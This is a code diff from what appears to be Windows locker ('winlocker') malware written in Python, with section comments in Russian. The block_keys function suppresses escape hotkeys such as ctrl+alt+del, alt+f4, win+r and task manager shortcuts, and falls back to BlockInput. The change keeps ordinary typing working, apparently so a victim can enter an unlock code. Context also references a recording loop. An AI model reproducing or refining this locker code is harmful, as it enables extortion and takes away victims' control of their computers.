@@ -507,17 +507,13 @@ def record_loop():
             except: pass
         except: time.sleep(1)
 
-# ===== ВИНЛОКЕР =====
+# ===== ВИНЛОКЕР (ИСПРАВЛЕНО - ВВОД РАБОТАЕТ) =====
 def block_keys():
     try:
         import keyboard
         combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']
         for c in combos:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
-            except: pass
-        keys = list('abcdefghijklmnopqrstuvwxyz0123456789') + ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','space','enter','backspace','tab','caps lock','shift','ctrl','alt','esc','delete','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','print screen','scroll lock','pause']
-        for k in keys:
-            try: keyboard.block_key(k)
             except: pass
     except:
         try: ctypes.windll.user32.BlockInput(True)
